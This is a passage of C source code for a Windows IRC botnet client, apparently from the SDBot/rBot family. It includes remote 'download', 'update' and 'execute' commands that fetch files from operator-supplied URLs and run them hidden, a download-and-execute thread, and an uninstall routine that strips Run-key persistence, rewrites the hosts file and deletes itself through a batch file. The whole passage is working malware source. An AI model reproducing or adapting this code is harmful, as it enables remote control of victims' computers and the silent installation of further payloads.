				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "[DL] Downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				if(CheckBadFunc("execute", FindUser(user, ulStart))) return 1;
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "[FILE] couldn't execute file.", notice);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				if(CheckBadFunc("download", FindUser(user, ulStart))) return 1;
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "[DL] Downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
		}
	}
	return repeat;
}

// irc send functions
void irc_send(SOCKET sock, char *msg)
{
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_sendf(SOCKET sock, char *msg, char *str)
{
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
{
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
{
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

// search-and-replace function for strings
char * replacestr(char *str, char *oldstr, char *newstr)
{
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
}

// function for downloading files/updating
DWORD WINAPI webdownload(LPVOID param)
{
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :[DL] Couldn't open %s.\r\n", dl.chan, dl.dest);
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 1;
		start = GetTickCount();

		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
			total = total + r;
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "[DL] File download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "[DL] Update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "[DL] downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :[DL] opened %s.\r\n", dl.chan, dl.dest);
			}

		// download is an update
		} else {
			sprintf(tstr, "[DL] downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "[DL] update failed: error executing file.", FALSE);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "[DL] bad url, or dns error.", FALSE);

	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
}

// function for removing the bot
void uninstall(void)
{
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	char MyOwnFile[MAX_PATH];

	// reset file attributes
	GetModuleFileName(0, MyOwnFile, sizeof(MyFile));
	SetFileAttributes((LPCSTR)MyOwnFile,FILE_ATTRIBUTE_NORMAL);

	// reset hosts file to the default one
	char szSystemDir[MAX_PATH];
	GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));
	SetFileAttributes((LPCSTR)szSystemDir,FILE_ATTRIBUTE_NORMAL);
	FILE *fp = fopen(szSystemDir, "w");
	fputs("127.0.0.1\tlocalhost\n", fp);
	fclose(fp);
	SetFileAttributes((LPCSTR)szSystemDir,FILE_ATTRIBUTE_READONLY);

	// remove our registry entries
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
}
